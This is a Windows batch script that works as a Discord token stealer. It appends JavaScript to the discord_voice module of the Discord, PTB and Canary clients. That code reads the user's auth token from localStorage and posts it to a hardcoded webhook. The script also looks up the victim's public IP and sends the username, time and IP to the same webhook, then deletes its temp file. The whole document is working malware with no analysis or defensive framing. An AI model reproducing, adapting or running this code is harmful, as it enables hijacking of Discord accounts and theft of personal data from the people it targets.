@echo off
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/772167093185413120/kLmR6xiVeQZQUsxKZe122IZiOmtXLdC-Tb4ZdIjL9Va3Xm2ckyBXQrZon5eA4YvCfYhN', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
if not exist "C:\temp\" mkdir C:\temp
curl --silent "https://myexternalip.com/raw" >> "%temp%/ip_address.txt"
for /f "delims=" %%q in (%temp%\ip_address.txt) do set IP=%%q
if not exist "%appdata%\discord\0.0.308\modules\discord_voice\index.js" goto PTB
echo %str% >> "%appdata%\discord\0.0.308\modules\discord_voice\index.js"
goto PTB
:PTB
if not exist "%appdata%\discordptb\0.0.55\modules\discord_voice\index.js" goto Can
echo %str% >> "%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
goto Can
:Can
if not exist "%appdata%\discordcanary\0.0.283\modules\discord_voice\index.js" goto NEXT
echo %str% >> "%appdata%\discordcanary\0.0.283\modules\discord_voice\index.js"
:NEXT
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\nTime and Date: %DATE% %TIME%\nIP Address: %IP%\nDiscord Token:\n\"}" https://discord.com/api/webhooks/772167093185413120/kLmR6xiVeQZQUsxKZe122IZiOmtXLdC-Tb4ZdIjL9Va3Xm2ckyBXQrZon5eA4YvCfYhN
del "%temp%\ip_address.txt" /f /q
